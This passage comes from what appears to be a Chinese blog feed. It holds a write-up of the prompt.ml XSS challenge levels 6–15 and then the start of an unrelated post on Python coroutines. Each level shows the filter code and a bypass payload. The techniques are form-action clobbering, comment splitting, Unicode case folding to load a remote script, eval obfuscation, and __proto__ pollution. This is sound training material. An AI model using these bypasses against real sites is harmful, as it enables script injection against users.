class="hljs-keyword">in</span> formData) &#123;<br>            <span class="hljs-keyword">var</span> input = form.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>));<br>            input.name = i;<br>            input.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>, formData[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> form.outerHTML + <span class="hljs-string">&#x27;                         \n\</span><br><span class="hljs-string">&lt;script&gt;                                                  \n\</span><br><span class="hljs-string">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="hljs-string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="hljs-string">        document.forms[0].submit();                       \n\</span><br><span class="hljs-string">    else                                                  \n\</span><br><span class="hljs-string">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="hljs-string">&lt;/script&gt;                                                 \n\</span><br><span class="hljs-string">        &#x27;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid form data.&#x27;</span>;<br>    &#125;<br>&#125;   <br></code></pre></td></tr></table></figure><p>整个代码就是根据输入来构造一个表单，源码中给了一个例子<code>http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</code>，输入之后，生成的代码为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;form action=<span class="hljs-string">&quot;http://httpbin.org/post&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Matt&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>                         <br>&lt;script&gt;                                                  <br>    <span class="hljs-comment">// forbid javascript: or vbscript: and data: stuff    </span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/script:|data:/i</span>.test(<span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action)) <br>        <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit();                       <br>    <span class="hljs-keyword">else</span>                                                  <br>        <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;Action forbidden.&quot;</span>)               <br>&lt;/script&gt;      <br></code></pre></td></tr></table></figure><p>可以认为，在这个表单中，<code>action</code>、<code>name</code>、<code>value</code>可控。<br>在这里用到了一个小<code>trick</code>，先上代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;form action=<span class="hljs-string">&quot;javascript:prompt(1)&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;123&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;233&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>         <br>&lt;script&gt;                                                  <br>    alert(<span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action);        <br>&lt;/script&gt; <br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190530201130.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;form action=<span class="hljs-string">&quot;javascript:prompt(1)&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;233&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>                         <br>&lt;script&gt;                                                  <br>    <span class="hljs-comment">// forbid javascript: or vbscript: and data: stuff    </span><br>    alert(<span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action);        <br>&lt;/script&gt;  <br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190530201356.png"><br>从上面两段代码中，我们可以知道，<code>action</code>会优先指向<code>name</code>为<code>action</code>的子<code>tag</code>。<br>因此可以构造<code>Payload</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;233&quot;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190530204531.png"></p><h3 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// pass in something like dog#cat#bird#mouse...</span><br>    <span class="hljs-keyword">var</span> segments = input.split(<span class="hljs-string">&#x27;#&#x27;</span>);<br>    <span class="hljs-keyword">return</span> segments.map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">title</span>) </span>&#123;<br>        <span class="hljs-comment">// title can only contsain 12 characters</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="hljs-number">0</span>, <span class="hljs-number">12</span>) + <span class="hljs-string">&#x27;&quot;&gt;&lt;/p&gt;&#x27;</span>;<br>    &#125;).join(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;        <br></code></pre></td></tr></table></figure><p>代码中使用<code>title.slice(0, 12)</code>限定了<code>title</code>长度为<code>12</code>。但是在前面又使用了<code>#</code>作为分割符，可以通过<code>JavaScript</code>的多行注释符来绕过。</p><p>Payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190530205545.png"></p><h3 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// prevent input from getting out of comment</span><br>    <span class="hljs-comment">// strip off line-breaks and stuff</span><br>    input = input.replace(<span class="hljs-regexp">/[\r\n&lt;/&quot;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;                                \n\</span><br><span class="hljs-string">&lt;script&gt;                                    \n\</span><br><span class="hljs-string">    // console.log(&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;);        \n\</span><br><span class="hljs-string">&lt;/script&gt; &#x27;</span>;<br>&#125;        <br></code></pre></td></tr></table></figure><p>想要执行代码，需要换行来跳出注释符的范围，从正则中可以看到，代码过滤了<code>\r</code>和<code>\n</code>两种换行符，还过滤了<code>&lt; </code>、<code>/</code>、 <code>&quot;</code></p><p>在这里使用了<code>unicode</code>编码的注释符来绕过。</p><p><code>Javascript</code>中的特殊字符。</p><table><thead><tr><th>Unicode 字符值</th><th>转义序列</th><th>含义</th><th>类别</th></tr></thead><tbody><tr><td>\u0008</td><td>\b</td><td>Backspace</td><td></td></tr><tr><td>\u0009</td><td>\t</td><td>Tab</td><td>空白</td></tr><tr><td>\u000A</td><td>\n</td><td>换行符（换行）</td><td>行结束符</td></tr><tr><td>\u000B</td><td>\v</td><td>垂直制表符</td><td>空白</td></tr><tr><td>\u000C</td><td>\f</td><td>换页</td><td>空白</td></tr><tr><td>\u000D</td><td>\r</td><td>回车</td><td>行结束符</td></tr><tr><td>\u0022</td><td>&quot;</td><td>双引号 (“)</td><td></td></tr><tr><td>\u0027</td><td>&#39;</td><td>单引号 (‘)</td><td></td></tr><tr><td>\u005C</td><td>\</td><td>反斜杠 ()</td><td></td></tr><tr><td>\u00A0</td><td></td><td>不间断空格</td><td>空白</td></tr><tr><td>\u2028</td><td></td><td>行分隔符</td><td>行结束符</td></tr><tr><td>\u2029</td><td></td><td>段落分隔符</td><td>行结束符</td></tr><tr><td>\uFEFF</td><td></td><td>字节顺序标记</td><td>空白</td></tr></tbody></table><p>构造<code>payload</code></p><p>网上wp上说是可以使用<code>\u2028</code>或者<code>\u2029</code>来绕过上述限制，不过没复现成功。</p><h3 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// filter potential start-tags</span><br>    input = input.replace(<span class="hljs-regexp">/&lt;([a-zA-Z])/g</span>, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>);<br>    <span class="hljs-comment">// use all-caps for heading</span><br>    input = input.toUpperCase();<br><br>    <span class="hljs-comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>;<br>&#125;        <br></code></pre></td></tr></table></figure><p>可以看到，代码将输入的字符进行了一个<code>toUpperCase()</code>操作，在这里用到了一个小<code>trick</code>。</p><p><img src="https://image.mengsec.com/xss-prompt/20190603151625.png"><br>这涉及到了<code>JavaScript</code>的一个特性</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">toUpperCase</span><span class="hljs-params">()</span></span>:<br>ı  ==&gt;I<br>ſ  ==&gt;S<br><br><span class="hljs-function"><span class="hljs-title">toLowerCase</span><span class="hljs-params">()</span></span>:<br>İ  ==&gt;i<br>K  ==&gt;k<br></code></pre></td></tr></table></figure><p>因此可以构造<code>payload</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;ſcript src=<span class="hljs-comment">//test.mengsec.com/1.js&gt;&lt;/ſcript&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190603221506.png"></p><h3 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// (╯°□°）╯︵ ┻━┻</span><br>    input = <span class="hljs-built_in">encodeURIComponent</span>(input).replace(<span class="hljs-regexp">/prompt/g</span>, <span class="hljs-string">&#x27;alert&#x27;</span>);<br>    <span class="hljs-comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span><br>    input = input.replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/script&gt; &#x27;</span>;<br>&#125;  <br></code></pre></td></tr></table></figure><p>这个题倒是蛮简单的，将输入的<code>prompt</code>替换成了<code>alert</code>，然后将单引号替换为空了。<br>直接构造<code>payload</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pro<span class="hljs-string">&#x27;mpt(1)</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190603221900.png"></p><h3 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// name should not contain special characters</span><br>    <span class="hljs-keyword">var</span> memberName = input.replace(<span class="hljs-regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-comment">// data to be parsed as JSON</span><br>    <span class="hljs-keyword">var</span> dataString = <span class="hljs-string">&#x27;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &#x27;</span> + memberName + <span class="hljs-string">&#x27;.&quot;&#125;&#x27;</span>;<br><br>    <span class="hljs-comment">// directly &quot;parse&quot; data in script context</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;                                \n\</span><br><span class="hljs-string">&lt;script&gt;                                    \n\</span><br><span class="hljs-string">    var data = &#x27;</span> + dataString + <span class="hljs-string">&#x27;;          \n\</span><br><span class="hljs-string">    if (data.action === &quot;login&quot;)            \n\</span><br><span class="hljs-string">        document.write(data.message)        \n\</span><br><span class="hljs-string">&lt;/script&gt; &#x27;</span>;<br>&#125;  <br></code></pre></td></tr></table></figure><p>在这里使用了in运算符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;(prompt(1))in&quot;</span><br></code></pre></td></tr></table></figure><p>通过前后的双引号来闭合字符串，借助<code>in</code>运算符来执行<code>js</code>代码。<br>虽然有报错，但是代码还是成功执行了</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Uncaught TypeError: <span class="hljs-string">&quot;Welcome back, &quot;</span> <span class="hljs-literal">is</span><span class="hljs-built_in"> not</span> a <span class="hljs-keyword">function</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190603223549.png"></p><h3 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// in Soviet Russia...</span><br>    input = <span class="hljs-built_in">encodeURIComponent</span>(input).replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-comment">// table flips you!</span><br>    input = input.replace(<span class="hljs-regexp">/prompt/g</span>, <span class="hljs-string">&#x27;alert&#x27;</span>);<br><br>    <span class="hljs-comment">// ノ┬─┬ノ ︵ ( \o°o)\</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/script&gt; &#x27;</span>;<br>&#125;     <br></code></pre></td></tr></table></figure><p>代码很明确，先过滤了单引号，又将<code>prompt</code>替换成了<code>alert</code>，在这里用到了一个小<code>trick</code>，借助<code>parseInt</code>方法，将字符串<code>prompt</code>作为<code>36</code>进制转换为数字，然后通过<code>eval</code>来执行<code>toString</code>来绕过代码中对<code>prompt</code>的过滤。</p><p>可得<code>payload</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">parseInt</span>(<span class="hljs-string">&quot;prompt&quot;</span>,<span class="hljs-number">36</span>) ==&gt; <span class="hljs-number">1558153217</span><br><span class="hljs-built_in">eval</span>((<span class="hljs-number">1558153217</span>).toString(<span class="hljs-number">36</span>))(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190604081234.png"></p><h3 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// extend method from Underscore library</span><br>    <span class="hljs-comment">// _.extend(destination, *sources) </span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">extend</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> source, prop;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>, length = <span class="hljs-built_in">arguments</span>.length; i &lt; length; i++) &#123;<br>            source = <span class="hljs-built_in">arguments</span>[i];<br>            <span class="hljs-keyword">for</span> (prop <span class="hljs-keyword">in</span> source) &#123;<br>                obj[prop] = source[prop];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-comment">// a simple picture plugin</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125;</span><br>        <span class="hljs-keyword">var</span> data = <span class="hljs-built_in">JSON</span>.parse(input);<br>        <span class="hljs-keyword">var</span> config = extend(&#123;<br>            <span class="hljs-comment">// default image source</span><br>            source: <span class="hljs-string">&#x27;http://placehold.it/350x150&#x27;</span><br>        &#125;, <span class="hljs-built_in">JSON</span>.parse(input));<br>        <span class="hljs-comment">// forbit invalid image source</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;<br>            <span class="hljs-keyword">delete</span> config.source;<br>        &#125;<br>        <span class="hljs-comment">// purify the source by stripping off &quot;</span><br>        <span class="hljs-keyword">var</span> source = config.source.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-comment">// insert the content using mustache-ish template</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#x27;</span>.replace(<span class="hljs-string">&#x27;&#123;&#123;source&#125;&#125;&#x27;</span>, source);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid image data.&#x27;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>简单分析一下代码，输入的需要是一个<code>json</code>字符串，在该<code>json</code>中，需要有一个键为<code>source</code>的键值对，而且它的值中只能有大小写字母数字和特殊符号<code>./:</code>，否则会被删除。然后将<code>source</code>的值替换<code>img</code>标签中的<code>&#123;&#123;source&#125;&#125;</code>，然后过滤掉双引号。</p><p>在这里用到了<code>JavaScript</code>的<code>__proto__</code>，它是对象的一个属性，用来标识对象本身所继承的原型。<br>当某个对象的属性无法找到时，<code>JavaScript</code>会从它的<code>__proto__</code>属性指向的原型中寻找该属性。<br>当我们输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;不符合正则的字符串&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;exp&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190604101530.png"></p><p>这样就成功绕过了正则的检测，但是后面还对双引号进行了过滤，这里用到了另一个<code>trick</code>。<br>看手册</p><p><img src="https://image.mengsec.com/xss-prompt/20190604102133.png"></p><p>测试一下</p><p><img src="https://image.mengsec.com/xss-prompt/20190604102847.png"></p><p>因此，我们可以利用<code>$\\</code>来传入一个<code>&quot;</code>，从而闭合标签。<br>构造Payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;!!&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;$`onerror=prompt(1)&gt;&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190604103333.png"></p><p>成功执行代码。</p><h3 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// I expect this one will have other solutions, so be creative :)</span><br>    <span class="hljs-comment">// mspaint makes all file names in all-caps :(</span><br>    <span class="hljs-comment">// too lazy to convert them back in lower case</span><br>    <span class="hljs-comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span><br>    input = input.toUpperCase();<br>    <span class="hljs-comment">// only allows images loaded from own host or data URI scheme</span><br>    input = input.replace(<span class="hljs-regexp">/\/\/|\w+:/g</span>, <span class="hljs-string">&#x27;data:&#x27;</span>);<br>    <span class="hljs-comment">// miscellaneous filtering</span><br>    input = input.replace(<span class="hljs-regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="hljs-string">&#x27;_&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;<br>&#125;  <br></code></pre></td></tr></table></figure><p>首先将输入使用方法<code>toUpperCase()</code>进行了处理，然后通过正则限定了协议为<code>data:</code>，在后面又过滤了多个特殊符号，将其替换为了<code>_</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">\ <span class="hljs-meta">&amp; + % 空白符 换行符等</span><br></code></pre></td></tr></table></figure><p>直接就想到了<code>base64</code>编码，但是<code>toUpperCase()</code>将所有的字母变成了大写，不太好办。<br>看wp是直接构造了一个<code>base64</code>编码后全部为大写的<code>payload</code>，没整出来。</p><h3 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// sort of spoiler of level 7</span><br>    input = input.replace(<span class="hljs-regexp">/\*/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-comment">// pass in something like dog#cat#bird#mouse...</span><br>    <span class="hljs-keyword">var</span> segments = input.split(<span class="hljs-string">&#x27;#&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> segments.map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">title, index</span>) </span>&#123;<br>        <span class="hljs-comment">// title can only contain 15 characters</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>) + <span class="hljs-string">&#x27;&quot; data-comment=\&#x27;&#123;&quot;id&quot;:&#x27;</span> + index + <span class="hljs-string">&#x27;&#125;\&#x27;&gt;&lt;/p&gt;&#x27;</span>;<br>    &#125;).join(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>说是level 7的升级版，结合<code>svg</code>标签和注释符<code>&lt;!-- --&gt;</code><br>构造<code>Payload</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(&lt;!--#--&gt;1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190604145802.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Writeup</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3 高级特性学习——协程</title>
    <link href="/2019/03/04/Python3-advanced-feature-learning/"/>
    <url>/2019/03/04/Python3-advanced-feature-learning/</url>
    
    <content type="html"><![CDATA[<p>最近想着重写一下自己很久前写的<code>CMS</code>指纹识别器，当时采用了<code>Python</code>的多线程来提高效率，由于<code>GIL锁</code>的存在，提升并不大。在查找资料的时候发现了<code>Python</code>协程这个高级特性，花了几天时间学习，在此整理一下。</p><a id="more"></a><h2 id="1-可迭代、迭代器、生成器"><a href="#1-可迭代、迭代器、生成器" class="headerlink" title="1. 可迭代、迭代器、生成器"></a>1. 可迭代、迭代器、生成器</h2><p>可迭代 <code>!==</code> 迭代器 <code>!==</code> 生成器</p><h3 id="1-1-可迭代"><a href="#1-1-可迭代" class="headerlink" title="1.1 可迭代"></a>1.1 可迭代</h3><p>在<code>Python3</code>中，有很多可迭代的对象，比如字符串、列表、字典等，但它们并不是迭代器。<br>可以借助<code>collections</code>这个模块的<code>isinstance()</code>方法，来判断这个对象是否可迭代(<code>Iterable</code>)，是否是迭代器(<code>Iterator</code>)，是否是生成器(<code>Generator</code>)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 